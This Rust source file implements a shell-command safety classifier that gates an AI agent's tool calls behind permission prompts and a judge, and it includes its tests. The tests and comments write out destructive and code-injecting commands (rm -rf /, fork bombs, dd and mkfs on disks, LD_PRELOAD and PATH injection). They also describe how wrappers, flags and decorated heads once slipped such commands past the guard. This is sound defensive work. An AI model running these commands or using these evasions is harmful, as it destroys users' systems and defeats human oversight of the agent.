/// | `'…'` | no | no |
/// | `$'…'` (ANSI-C) | no | YES |
/// | `"…"` | YES | yes |
///
/// Collapsing any pair loses a real command. Tracking single quotes alone
/// reads `echo "'$(rm -rf /)'"` as quoted. Reading `$'…'` as a plain
/// single-quoted run inverts the state from its first `\'` onward, so
/// `echo $'\'' $(rm -rf /)` looks quoted to the end of the line.
#[derive(Default)]
struct QuoteState {
    in_single: bool,
    in_double: bool,
    in_ansi_c: bool,
}

impl QuoteState {
    /// Advance past the byte at `i` when it is quoting syntax, an escaped
    /// character, or content inside a run where no substitution expands.
    /// `Some(next_index)` means the caller must not read this byte. `None`
    /// means it is live shell syntax the caller owns.
    fn step(&mut self, s: &str, i: usize) -> Option<usize> {
        self.advance(s, i, Self::suppresses_expansion)
    }

    /// [`Self::step`], for a caller that also has to ignore bytes inside a
    /// DOUBLE-quoted run. A `$(` expands there, but a parenthesis is text.
    fn step_all_quotes(&mut self, s: &str, i: usize) -> Option<usize> {
        self.advance(s, i, Self::quoted)
    }

    fn advance(&mut self, s: &str, i: usize, skip: fn(&Self) -> bool) -> Option<usize> {
        let b = s.as_bytes();
        if self.backslash_escapes() && b[i] == b'\\' {
            return Some(i + 1 + char_len_at(s, i + 1));
        }
        match self.consume(b, i) {
            0 if skip(self) => Some(i + char_len_at(s, i)),
            0 => None,
            n => Some(i + n),
        }
    }

    /// Open or close a quoted run. Returns the bytes consumed, or 0 when the
    /// byte is ordinary content.
    fn consume(&mut self, b: &[u8], i: usize) -> usize {
        let c = b[i];
        if self.in_single {
            return self.close_on(c, b'\'', |q| &mut q.in_single);
        }
        if self.in_ansi_c {
            return self.close_on(c, b'\'', |q| &mut q.in_ansi_c);
        }
        if self.in_double {
            return self.close_on(c, b'"', |q| &mut q.in_double);
        }
        match c {
            b'$' if b.get(i + 1) == Some(&b'\'') => {
                self.in_ansi_c = true;
                2
            }
            b'\'' => {
                self.in_single = true;
                1
            }
            b'"' => {
                self.in_double = true;
                1
            }
            _ => 0,
        }
    }

    fn close_on(&mut self, c: u8, closer: u8, field: fn(&mut Self) -> &mut bool) -> usize {
        if c == closer {
            *field(self) = false;
            return 1;
        }
        0
    }

    /// True where a backslash escapes the next character. Only a plain
    /// single-quoted run takes a backslash literally.
    fn backslash_escapes(&self) -> bool {
        !self.in_single
    }

    /// True where no substitution opener is live.
    fn suppresses_expansion(&self) -> bool {
        self.in_single || self.in_ansi_c
    }

    /// True where a parenthesis is ordinary text rather than shell syntax.
    fn quoted(&self) -> bool {
        self.in_single || self.in_double || self.in_ansi_c
    }
}

/// Byte length of the character starting at `at`, so a byte walk over `s`
/// stays on char boundaries.
fn char_len_at(s: &str, at: usize) -> usize {
    s[at..].chars().next().map_or(1, char::len_utf8)
}

/// True for a recursive flag in either long (`--recursive`) or short-cluster
/// (`-r`, `-R`, `-rf`, `-fr`, `-Rf`) form.
fn is_recursive_flag(arg: &str) -> bool {
    if arg == "--recursive" {
        return true;
    }
    if arg.starts_with("--") {
        return false;
    }
    match arg.strip_prefix('-') {
        Some(cluster) => cluster.chars().any(|c| c == 'r' || c == 'R'),
        None => false,
    }
}

/// True for a token that names the filesystem root or home directory, the only
/// targets the catastrophic lane recognises. Tolerates surrounding quotes and
/// the common `$HOME` and `~` spellings.
fn is_catastrophic_target(tok: &str) -> bool {
    // Trailing shell punctuation comes off with the quotes. `normalized_head`
    // already strips the OPENING grouping token off the head. Without the
    // matching close, the target keeps its bracket and the pair escapes the
    // hard block into the merely-dangerous lane.
    //
    // A trailing `}` is only a group closer when the token opened no brace of
    // its own: `${HOME}` carries its own, and trimming it unconditionally
    // stopped `rm -rf ${HOME}` from matching at all.
    // A trailing backslash comes off with them. At the end of a command
    // `rm -rf /\` still deletes the root: the shell reads the backslash as a
    // line continuation, so the target it acts on is a bare `/`.
    let unquoted = tok.trim_matches(|c| c == '"' || c == '\'');
    let t = if unquoted.contains('{') {
        unquoted.trim_end_matches([';', ')', '\\'])
    } else {
        unquoted.trim_end_matches([';', ')', '}', '\\'])
    };
    matches!(
        t,
        "/" | "/*"
            // Other spellings of the same root directory. `ls -di // /` reports
            // the same inode for both.
            | "//"
            | "/."
            | "/./"
            | "~"
            | "~/"
            | "~/*"
            | "$HOME"
            | "${HOME}"
            | "$HOME/"
            | "${HOME}/"
            | "$HOME/*"
            | "${HOME}/*"
    )
}

// ===========================================================================
// IrreversibleDanger — the static "dangerous" list, now category-tagged.
//
// This is not the primary detector. It has two supporting roles, both
// category-aware so an unattended trigger can match a command against its
// side-effect grant:
//   1. [`fallback_classify`] classifies the ambiguous middle when the judge is
//      off or unavailable. It flags the obvious side-effects from this list,
//      routes destruction shapes through the static destruction scan, and runs
//      the rest. The matching category is what the trigger grant check keys on.
//   2. [`permission_summary`] derives the card text from the category when the
//      judge produced no tailored summary.
// The judge is the primary classifier. It widens coverage and cuts false
// positives. Keep this list conservative: every match costs a permission prompt
// or a trigger block on the fallback path.
// ===========================================================================

/// The [`SideEffectCategory`] a command statically looks like: the static
/// counterpart of the judge's category tag, and the trigger grant key when the
/// judge is unavailable. `None` when no obvious side-effect shape matches.
///
/// Scans both shapes, per-segment shell command heads and inline Python calls.
/// Each scan is harmless on the other tool's text. Out-of-workspace destruction
/// is not this list's job, and [`fallback_classify`]'s destruction scan tags
/// it.
pub fn static_side_effect_category(command: &str) -> Option<SideEffectCategory> {
    if let Some(cat) = python_side_effect_category(command) {
        return Some(cat);
    }
    command_segments(command).find_map(|s| segment_side_effect_category(&s))
}

/// Side-effect category for one shell command segment, or `None`. Skips the same
/// benign prefixes the catastrophic scan does so `sudo curl -X POST …` is seen.
fn segment_side_effect_category(segment: &str) -> Option<SideEffectCategory> {
    let toks: Vec<&str> = segment.split_whitespace().collect();
    // Resolved exactly like the danger scans, decorations and bare grouping
    // tokens included. This category is what an unattended trigger's grant is
    // checked against. A head that resolves to nothing here would skip the
    // grant check entirely and auto-allow. The shared resolver can only derive
    // a category where there was none, and it keeps the three head-resolving
    // scans from drifting apart.
    danger_head_candidates(&toks)
        .into_iter()
        .find_map(|(base, args)| match base.as_str() {
            "curl" | "wget" => is_mutating_http(args).then_some(SideEffectCategory::ExternalApi),
            "mail" | "mailx" | "sendmail" | "osascript" => Some(SideEffectCategory::Email),
            "gh" | "aws" | "gcloud" => Some(SideEffectCategory::CloudCli),
            _ => None,
        })
}

/// True when curl or wget args carry a write HTTP method, or a request body:
/// the signal that the call mutates server state rather than just reading. A
/// bare GET is NOT flagged.
fn is_mutating_http(args: &[&str]) -> bool {
    const MUTATING_METHODS: &[&str] = &["POST", "PUT", "DELETE", "PATCH"];
    // Data / upload flags imply a body (curl defaults to POST when given data;
    // `--json` is POST with JSON headers; wget's --post-data/--post-file
    // always POST).
    const BODY_FLAGS: &[&str] = &[
        "--data",
        "-d",
        "--data-raw",
        "--data-binary",
        "--data-urlencode",
        "--data-ascii",
        "--json",
        "--form",
        "--form-string",
        "-F",
        "--upload-file",
        "-T",
        "--post-data",
        "--post-file",
    ];
    let mut prev_was_method_flag = false;
    for arg in args {
        let upper = arg.to_ascii_uppercase();
        // `-X POST` / `--request PUT` — method in the next token.
        if prev_was_method_flag {
            if MUTATING_METHODS.iter().any(|m| upper == *m) {
                return true;
            }
            prev_was_method_flag = false;
        }
        if *arg == "-X" || *arg == "--request" || *arg == "--method" {
            prev_was_method_flag = true;
            continue;
        }
        // Combined `-XPOST` / `--request=PUT` / `--method=POST`.
        for pre in ["-X", "--request=", "--method="] {
            if let Some(rest) = upper.strip_prefix(&pre.to_ascii_uppercase()) {
                if MUTATING_METHODS.contains(&rest) {
                    return true;
                }
            }
        }
        // Body / upload flags, both the space-separated form (`--data 'x'`) and
        // the `=`-glued long-flag form (`--data=x`, `--post-data=x`). Glued
        // short-flag forms (`-d@file`) are not matched — the LLM emits the
        // space-separated form, and the Phase 3 judge covers the long tail.
        if BODY_FLAGS.contains(arg)
            || BODY_FLAGS
                .iter()
                .any(|f| f.len() > 2 && arg.starts_with(&format!("{f}=")))
        {
            return true;
        }
    }
    false
}

/// The side-effect category of Python `code`, or `None`. Best-effort substring
/// match (the judge does the real work later): the common `requests.<write>(`,
/// `httpx.<write>(`, and `session.<write>(` shapes map to
/// [`SideEffectCategory::ExternalApi`]; `smtplib` maps to
/// [`SideEffectCategory::Email`].
fn python_side_effect_category(code: &str) -> Option<SideEffectCategory> {
    const WRITE_CALLS: &[&str] = &[
        "requests.post(",
        "requests.put(",
        "requests.patch(",
        "requests.delete(",
        "httpx.post(",
        "httpx.put(",
        "httpx.patch(",
        "httpx.delete(",
        "session.post(",
        "session.put(",
        "session.patch(",
        "session.delete(",
    ];
    if WRITE_CALLS.iter().any(|c| code.contains(c)) {
        return Some(SideEffectCategory::ExternalApi);
    }
    if code.contains("smtplib") {
        return Some(SideEffectCategory::Email);
    }
    None
}

/// The command head of every segment of `command` that actually runs a
/// command, as a BASENAME with benign prefixes and leading redirects skipped.
/// Redirect-only and empty segments contribute nothing.
///
/// This is the DERIVATION side of the grant lane: what an "Always allow" click
/// stores. Basenaming is right here, because `/usr/bin/git push` should store
/// `git`. It is wrong on the matching side, which has its own function,
/// [`segment_heads_as_written`]. Read that one before merging the two back
/// together.
///
/// The shell wrapper is unwrapped first, the same way [`static_classify`] does
/// before it classifies. Without that, every `bash -lc '<script>'` resolves to
/// the single head `bash`. A card gating one wrapped command then stores
/// `Bash(bash:*)` as its NARROW grant. That one grant auto-allows every later
/// wrapped command, whatever its script does.
pub fn segment_heads(command: &str) -> Vec<String> {
    heads_of(command, |head| head.rsplit('/').next().unwrap_or(head))
}

/// The head token of every segment, exactly as the command WROTE it: no
/// basename, no decoration stripped.
///
/// This is the MATCHING side of the grant lane, and the asymmetry with
/// [`segment_heads`] is deliberate. A grant stores a basename. Basenaming here
/// too would let a stored `Bash(ls:*)` cover `data/bin/ls`, a binary the agent
/// writes in-workspace and then runs with no card. The Safe fast path refuses
/// a path-qualified head for that same reason.
///
/// Keeping the token verbatim yields `Bash(data/bin/ls:*)`, a pattern no
/// derivation ever produces, so no stored grant can cover it. A decorated head
/// (`\ls`, `"ls"`) falls the same way and costs one card, which is the
/// direction to fail in.
pub fn segment_heads_as_written(command: &str) -> Vec<String> {
    heads_of(command, |head| head)
}

/// Shared walk behind the two head lists: unwrap the shell wrapper, split into
/// segments, resolve each segment's head, and map it through `resolve`.
fn heads_of(command: &str, resolve: fn(&str) -> &str) -> Vec<String> {
    let unwrapped = unwrap_shell_command(command);
    command_segments(&unwrapped)
        .filter_map(|segment| {
            let toks: Vec<&str> = segment.split_whitespace().collect();
            let i = command_head_index(&toks);
            let head = resolve(toks.get(i)?);
            (!head.is_empty()).then(|| head.to_string())
        })
        .collect()
}

/// The first entry of [`segment_heads`], used to derive the allow-pattern an
/// "Always allow" click STORES. The card's narrow button is labeled with it.
/// `None` for a command that runs nothing. Deterministic, so the stored pattern
/// matches the pattern checked on the next prompt.
pub fn first_command_token(command: &str) -> Option<String> {
    segment_heads(command).into_iter().next()
}

/// Whether the granted pattern set covers every command that `command` runs,
/// with `label` as the tool prefix: `Bash` on the chat lane, `Bash` or
/// `command_execution` on the coding-agent one.
///
/// One predicate for both lanes, so the two cannot drift. A bare `label` grant
/// means "any command" and covers everything. Otherwise EVERY segment head
/// must be covered by its own `label(<head>:*)` pattern. Matching only the
/// first head would let `git status && curl -X POST …` ride into a `git`
/// grant. A command running nothing derivable is never covered.
///
/// A grant names a HEAD, so it can only stand for a command whose head is what
/// runs. Every [`FastPathDecline::Refusal`] is the finding that it is not, so
/// this refuses the whole set through that one predicate rather than a second
/// list. `LD_PRELOAD=/tmp/evil.so ls` resolves to `ls`, and `echo $(rm -rf ~)`
/// to `echo`. On the coding-agent lane the check runs BEFORE classification,
/// so it is the only thing standing there.
///
/// A broad `label` grant is deliberately still honoured: it means "any
/// command", which this is one of.
pub fn grant_covers_command(label: &str, command: &str, allowed: impl Fn(&str) -> bool) -> bool {
    if allowed(label) {
        return true;
    }
    let unwrapped = unwrap_shell_command(command);
    if bash_fast_path(&unwrapped) == Some(FastPathDecline::Refusal) {
        return false;
    }
    let heads = segment_heads_as_written(command);
    !heads.is_empty() && heads.iter().all(|h| allowed(&format!("{label}({h}:*)")))
}

/// The fallback one-line card text for an `IrreversibleDanger` permission
/// prompt — used only when the judge produced no tailored summary (judge off or
/// failed). Derived from the static side-effect category. The command itself is
/// carried separately on the `CommandPermissionRequested` event and shown by the
/// card.
pub fn permission_summary(tool_name: &str, input: &Value) -> String {
    let cmd = command_text(tool_name, input).unwrap_or("");
    let reason = static_side_effect_category(cmd)
        .map(|c| c.reason())
        .unwrap_or("an irreversible real-world side-effect");
    format!("May perform {reason}.")
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn bash(cmd: &str) -> StaticVerdict {
        static_classify(tn::RUN_BASH, &json!({ "command": cmd }))
    }

    fn python(code: &str) -> StaticVerdict {
        static_classify(tn::RUN_PYTHON, &json!({ "code": code }))
    }

    fn assert_settled(v: StaticVerdict, lane: RiskLane, ctx: &str) {
        assert_eq!(v, StaticVerdict::Settled(lane), "{ctx}");
    }

    fn assert_needs_judge(v: StaticVerdict, ctx: &str) {
        assert!(
            matches!(v, StaticVerdict::NeedsJudge(_)),
            "{ctx} — expected NeedsJudge, got {v:?}"
        );
    }

    // --- Catastrophic: recursive rm/chmod of root or home -------------------

    #[test]
    fn catastrophic_rm_root_and_obfuscations() {
        for cmd in [
            "rm -rf /",
            "rm -rf /*",
            "rm -fr /",
            "rm -r -f /",
            "rm --recursive --force /",
            "rm  -rf   /",  // collapsed whitespace
            "rm -rf \"/\"", // quoted target
            "rm -rf '/'",
            "rm -rf -- /",   // end-of-options
            "sudo rm -rf /", // privilege prefix
            "rm -rf ~",
            "rm -rf ~/",
            "rm -rf $HOME",
            "rm -rf ${HOME}",
            "cd /tmp && rm -rf /", // chained segment
            "/bin/rm -rf /",       // absolute path to rm
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    #[test]
    fn catastrophic_survives_a_shell_c_wrapper() {
        // Every scan reads a segment's HEAD token, so a `sh -c '<script>'`
        // wrapper used to hide the payload behind head `bash`/`zsh`: the
        // catastrophic hard-block was skipped and, with the judge off, the
        // static fallback settled it Safe and ran `rm -rf /` with no card.
        for cmd in [
            "bash -c 'rm -rf /'",
            "bash -c \"rm -rf /\"",
            "/bin/zsh -lc 'rm -rf ~'",
            "sh -c 'chmod -R 777 /'",
            "bash -c 'cd /tmp && rm -rf /'",
            // `sh -c <script> [$0 [arg ...]]`: the script is ONE word and the
            // operands after it only set $0 and the positional params, so these
            // run `rm -rf /` too. Cutting at the matching close quote is what
            // stops the head token from reading as `'rm`.
            "bash -c 'rm -rf /' ignored",
            "bash -c \"rm -rf /\" sh extra",
            "/bin/zsh -lc 'rm -rf ~' zsh",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    /// A flag on the wrapper hid the payload just as well as a `sh -c` did.
    /// `is_benign_prefix` never matches a `-`-prefixed token, so the head walk
    /// stopped on the FLAG: `sudo -E rm -rf /` resolved to head `-E`, matched
    /// none of the danger tables, and settled `Safe`, i.e. auto-allowed
    /// outright on the unattended coding-agent lane with the catastrophic
    /// hard-block skipped. Both flag arities are scanned now, so a `-u root`
    /// that consumes its argument cannot hide the payload either.
    #[test]
    fn catastrophic_survives_a_flag_on_the_wrapper() {
        for cmd in [
            "sudo -E rm -rf /",
            "sudo -H rm -rf ~",
            "sudo -u root rm -rf /",
            "sudo --preserve-env=PATH rm -rf /",
            "env -i rm -rf /",
            "env -u LD_PRELOAD rm -rf /",
            "nice -n 10 rm -rf /",
            "sudo -E chmod -R 777 /",
            "true && sudo -E rm -rf /",
            "sudo -E -H rm -rf /",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    /// The same walk gates the two lower danger scans, so a wrapper flag also
    /// hid an out-of-workspace deletion and a mutating API call behind `Safe`.
    #[test]
    fn wrapper_flag_does_not_hide_destruction_or_side_effects() {
        for cmd in ["sudo -E rm -rf /etc/nginx", "env -i rm -rf /var/log"] {
            assert_eq!(
                bash_destruction_scope(cmd),
                Some(DestructionScope::OutOfWorkspace),
                "{cmd}"
            );
        }
        assert_eq!(
            static_side_effect_category("sudo -E curl -X POST https://example.com/pay"),
            Some(SideEffectCategory::ExternalApi),
        );
        assert_eq!(
            static_side_effect_category("env -u FOO gh release create v1"),
            Some(SideEffectCategory::CloudCli),
        );
    }

    /// Branching on a flag-shaped head must not invent danger where the head is
    /// an ordinary command word: an `rm -rf /` sitting in a quoted ARGUMENT is
    /// not a command, and the walk never branches past a non-flag head.
    #[test]
    fn wrapper_flag_branching_does_not_over_report() {
        for cmd in [
            "git commit -m \"rm -rf / is bad\"",
            "grep -rn 'rm -rf /' docs",
            "echo sudo -E rm -rf /",
        ] {
            assert_ne!(
                bash(cmd),
                StaticVerdict::Settled(RiskLane::Catastrophic),
                "{cmd}"
            );
        }
    }

    /// Resolving the Safe fast path's head by BASENAME lets a binary the agent
    /// just wrote run with no card, no checkpoint and no judge call. That is
    /// the write-then-run escalation `PATH=` is on
    /// `CODE_INJECTING_ENV_NAMES` to close, reachable without the preamble. A
    /// path-qualified head falls through to the judge.
    #[test]
    fn a_path_qualified_head_never_settles_safe() {
        for cmd in [
            "data/bin/ls",
            "./ls -la",
            "/tmp/ls",
            "bin/cat secrets.txt",
            "sudo ./ls",
            "ls && ./cat x",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // A bare name is unaffected.
        assert_settled(bash("ls -la"), RiskLane::Safe, "ls -la");
    }

    /// A wrapper only has to move out of the FIRST segment to hide.
    /// `static_classify` unwraps the outermost one. Prefixing any read-only
    /// command leaves the payload behind a head token of `bash`, and the whole
    /// line falls through to Safe. The unwrap is per segment.
    #[test]
    fn catastrophic_survives_a_shell_c_wrapper_in_a_later_segment() {
        for cmd in [
            "true && bash -c 'rm -rf /'",
            "echo hi; bash -c 'rm -rf /'",
            "ls | /bin/zsh -lc 'rm -rf ~'",
            "pwd && sh -c 'chmod -R 777 /'",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    /// A decorated head names the same binary: `\rm` bypasses aliases, quotes
    /// are stripped by the shell, and `{`/`(` are grouping tokens. Comparing the
    /// raw token meant every one of these read as an unknown command and
    /// classified Safe.
    #[test]
    fn catastrophic_sees_through_a_decorated_head() {
        for cmd in [
            r"\rm -rf /",
            "\"rm\" -rf /",
            "'rm' -rf /",
            // ANSI-C and locale quoting run the same binary, and the `$`
            // blocked the quote trim that resolves the other spellings.
            r"$'rm' -rf /",
            "$\"rm\" -rf /",
            r"\chmod -R 777 /",
            "{ rm -rf /",
            "( rm -rf /",
            r"true && \rm -rf ~",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    /// A `VAR=value` preamble is skipped when resolving the head. That is right
    /// for an ordinary variable and wrong for the ones the dynamic loader and
    /// the interpreters EXECUTE. Those settle Safe on the read-only head and
    /// run arbitrary code with no card and no checkpoint.
    #[test]
    fn a_code_injecting_env_assignment_is_never_settled_safe() {
        for cmd in [
            "LD_PRELOAD=/tmp/evil.so ls",
            "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib ls -la",
            "BASH_ENV=/tmp/x cat data/f.txt",
            "PYTHONSTARTUP=/tmp/x echo hi",
            "NODE_OPTIONS=--require=/tmp/x echo hi",
        ] {
            assert!(
                !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                "{cmd} must not settle Safe"
            );
        }
        // An ordinary assignment still rides the read-only fast path.
        assert_settled(bash("FOO=1 ls"), RiskLane::Safe, "FOO=1 ls");
        // The exact-name entries (`ENV=`, `IFS=`) still catch their own name.
        for cmd in ["ENV=/tmp/rc bash -c 'echo hi'", "IFS=, cat data/f.txt"] {
            assert!(
                !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                "{cmd} must not settle Safe"
            );
        }
    }

    /// `PATH=` is the most direct code-injecting assignment: the agent can write
    /// the target with an ordinary in-workspace write and then run it under a
    /// read-only head.
    #[test]
    fn a_path_preamble_is_never_settled_safe() {
        for cmd in ["PATH=data/bin ls", "PATH=/tmp:$PATH cat data/f.txt"] {
            assert!(
                !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                "{cmd} must not settle Safe"
            );
        }
        // The `*_PATH=` build variables and PATHEXT keep the fast path.
        for cmd in ["PATHEXT=.EXE ls", "MY_PATH=/tmp ls"] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    /// A preamble makes the whole line a refusal, which is the one verdict
    /// both permissive paths key on: the Safe fast path here, and
    /// [`grant_covers_command`]'s grant lane.
    #[test]
    fn code_injecting_env_is_detected_across_every_segment() {
        let refuses = |cmd: &str| bash_fast_path(cmd) == Some(FastPathDecline::Refusal);
        assert!(refuses("LD_PRELOAD=/tmp/evil.so ls"));
        assert!(refuses("PATH=data/bin ls"));
        // Not only the first segment.
        assert!(refuses("ls && LD_PRELOAD=/tmp/evil.so cat data/f.txt"));
        // An ordinary assignment, and the same text past the head, are not.
        assert!(!refuses("FOO=1 ls && git status"));
        assert!(!refuses("grep NODE_OPTIONS= data/f.txt"));
    }

    /// A decorated shell head hid the whole `-c` payload from every scan.
    ///
    /// Covers the DECORATION forms only. A wrapper reached past a benign prefix
    /// (`sudo bash -c '…'`, `env bash -c '…'`) is still not unwrapped, because
    /// `unwrap_shell_command` resolves the first token rather than the head. See
    /// `docs/known-gaps.md` § "The command guard does not see through every
    /// shell-wrapper or substitution form".
    #[test]
    fn a_decorated_shell_wrapper_still_unwraps_its_payload() {
        for cmd in [r"\bash -c 'rm -rf /'", "\"bash\" -c 'rm -rf /'"] {
            assert!(
                matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Catastrophic)),
                "{cmd} must hard-block"
            );
        }
    }

    /// `normalized_head` strips the opening grouping token off the head, so the
    /// matching closer has to come off the target or the pair escapes the block.
    #[test]
    fn catastrophic_sees_a_glued_subshell_on_both_ends() {
        for cmd in ["(rm -rf /)", "{ rm -rf /;}", "(rm -rf ~)"] {
            assert!(
                matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Catastrophic)),
                "{cmd} must hard-block"
            );
        }
    }

    /// The side-effect category gates an unattended trigger's grant check, so a
    /// decorated head that derived no category skipped the check entirely.
    #[test]
    fn side_effect_category_sees_through_a_decorated_head() {
        use SideEffectCategory::*;
        assert_eq!(
            static_side_effect_category(r"\curl -X POST https://example.com -d @data/f.txt"),
            Some(ExternalApi)
        );
        assert_eq!(
            static_side_effect_category("\"gh\" pr create"),
            Some(CloudCli)
        );
        assert_eq!(
            static_side_effect_category(r"\mail -s x user@example.com"),
            Some(Email)
        );
        // Bare grouping tokens too, which is what sharing `danger_head_and_args`
        // buys: `normalized_head("{")` alone resolves to the empty string.
        assert_eq!(
            static_side_effect_category("{ gh pr create ; }"),
            Some(CloudCli)
        );
        assert_eq!(
            static_side_effect_category("( aws s3 rm x )"),
            Some(CloudCli)
        );
    }

    /// A `-c` script operand is cut at its close quote because `sh -c <script>
    /// [$0 args]` makes the rest positional parameters. A control operator in
    /// that tail is NOT a positional parameter: the outer shell runs it, so
    /// discarding it hid whole commands from every scan.
    #[test]
    fn a_tail_after_the_script_operand_is_never_discarded() {
        for cmd in [
            "bash -c 'echo hi'; rm -rf /",
            "bash -c 'echo hi' && rm -rf ~",
            "/bin/zsh -lc 'ls' ; rm -rf /",
            r"\bash -c 'echo hi'; rm -rf /",
        ] {
            assert!(
                matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Catastrophic)),
                "{cmd} must hard-block on its tail"
            );
        }
        // The documented `$0 args` form is still unwrapped to the script alone.
        assert_eq!(
            unwrap_shell_command("bash -c 'rm -rf /' ignored"),
            "rm -rf /"
        );
        assert_eq!(unwrap_shell_command("/bin/zsh -lc 'ls -la'"), "ls -la");
    }

    /// The `-c` cluster accepts any shell option letter, not an enumerated set:
    /// the ones an enumerated set missed all run the script.
    #[test]
    fn every_shell_option_cluster_carrying_c_is_a_wrapper() {
        for flag in [
            "-c", "-lc", "-uc", "-vc", "-Tc", "-pc", "-Bc", "-Cc", "-hc", "-bc",
        ] {
            let cmd = format!("bash {flag} 'rm -rf /'");
            assert!(
                matches!(bash(&cmd), StaticVerdict::Settled(RiskLane::Catastrophic)),
                "{cmd} must hard-block"
            );
        }
        // Long options and non-letter clusters are still not `-c`.
        assert!(!is_shell_c_flag("--config"));
        assert!(!is_shell_c_flag("-l"));
        assert!(!is_shell_c_flag("-c1"));
    }

    /// Redirection in the discarded tail belongs to the OUTER shell.
    #[test]
    fn a_redirect_after_the_script_operand_is_never_discarded() {
        for cmd in [
            "bash -c 'echo x' > /etc/crontab",
            "/bin/zsh -lc 'echo x' > ~/.zshrc",
            "bash -c 'echo x' >> /etc/hosts",
        ] {
            assert!(
                !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                "{cmd} must not settle Safe"
            );
        }
    }

    /// The environment equivalents of `git -c`, which `git_subcommand_safety`
    /// already refuses by name.
    #[test]
    fn a_git_config_env_preamble_is_never_settled_safe() {
        for cmd in [
            "GIT_CONFIG_GLOBAL=data/g git diff",
            "GIT_CONFIG_SYSTEM=data/g git log",
            "GIT_CONFIG_COUNT=1 git diff",
        ] {
            assert!(
                !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                "{cmd} must not settle Safe"
            );
            assert_eq!(bash_fast_path(cmd), Some(FastPathDecline::Refusal), "{cmd}");
        }
        assert_settled(bash("git diff"), RiskLane::Safe, "git diff");
    }

    /// Other spellings of the filesystem root reach the same inode.
    #[test]
    fn catastrophic_covers_every_spelling_of_root() {
        for cmd in ["rm -rf //", "rm -rf /.", "rm -rf /./"] {
            assert!(
                matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Catastrophic)),
                "{cmd} must hard-block"
            );
        }
    }

    /// bash's append form assigns the same variable.
    #[test]
    fn the_append_form_of_a_code_injecting_assignment_is_caught() {
        for cmd in ["PATH+=:data/bin ls", "IFS+=, cat data/f.txt"] {
            assert!(
                !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                "{cmd} must not settle Safe"
            );
        }
        assert_eq!(
            bash_fast_path("PATH+=:data/bin ls"),
            Some(FastPathDecline::Refusal)
        );
        // An ordinary append is unaffected.
        assert_settled(bash("FOO+=1 ls"), RiskLane::Safe, "FOO+=1 ls");
    }

    /// The guard above is a fast-path REFUSAL, so an over-broad match costs
    /// every routine command a judge round-trip. Two ways it over-matched:
    /// treating the exact-name entries as prefixes, and scanning the whole
    /// segment instead of the assignment preamble.
    #[test]
    fn ordinary_env_names_and_arguments_keep_the_read_only_fast_path() {
        for cmd in [
            // `ENV=` / `IFS=` are exact names, not prefixes.
            "ENVIRONMENT=staging cat data/config.yaml",
            "ENV_FILE=.env ls",
            "IFS_MODE=x echo hi",
            // Past the head the same text is an argument, not an assignment.
            "grep NODE_OPTIONS= data/f.txt",
            "echo LD_PRELOAD=x",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn catastrophic_chmod_root() {
        for cmd in [
            "chmod -R 777 /",
            "chmod -R 000 /",
            "chmod --recursive 777 ~",
            "sudo chmod -R 777 ${HOME}",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    #[test]
    fn in_workspace_rm_chmod_goes_to_judge() {
        // No longer settled Safe statically — `rm`/`chmod`/`mv`/`cp` are
        // destructive shapes the judge classifies (in-workspace → reversible,
        // out-of-workspace → irreversible). The point: they are NOT catastrophic
        // and NOT auto-safe; the judge (or static fallback) decides.
        for cmd in [
            "rm -rf data/tmp",
            "rm -rf ./build",
            "rm data/artifacts/report.csv",
            "rm -f data/cache/x",
            "chmod -R 755 data/apps/foo",
            "mv data/a data/b",
            "cp data/a data/b",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn safe_when_mentioning_but_not_running_rm() {
        // Searching logs / printing the string must not be mistaken for running
        // it — the head is read-only.
        for cmd in [
            "grep -r \"rm -rf /\" logs/",
            "echo 'never run rm -rf /'",
            "cat notes_about_rm_-rf_slash.txt",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn rm_is_never_catastrophic_without_root_target() {
        // Not catastrophic (no recursive-root match) → the judge sees them.
        for cmd in ["rm /", "rm -f /", "rm -rf /home/user/project"] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    // --- Catastrophic: fork bombs ------------------------------------------

    #[test]
    fn catastrophic_fork_bombs() {
        for cmd in [
            ":(){ :|:& };:",
            ":(){:|:&};:",
            "bomb(){ bomb|bomb& };bomb",
            "f() { f | f & }",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    // --- Catastrophic: disk format / overwrite -----------------------------

    #[test]
    fn catastrophic_disk_ops() {
        for cmd in [
            "mkfs.ext4 /dev/sda",
            "mkfs /dev/nvme0n1",
            "dd if=/dev/zero of=/dev/sda bs=1M",
            "dd if=/dev/zero of=/dev/disk2",
            "cat image.iso > /dev/sdb",
            "echo x >/dev/nvme0n1",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    #[test]
    fn safe_harmless_device_redirects_and_reads() {
        // Read-only heads + harmless `/dev/null`-style redirects stay Safe.
        for cmd in [
            "echo hi > /dev/null",
            "command 2>/dev/null",
            "cat /dev/urandom | head -c 16 > data/seed",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
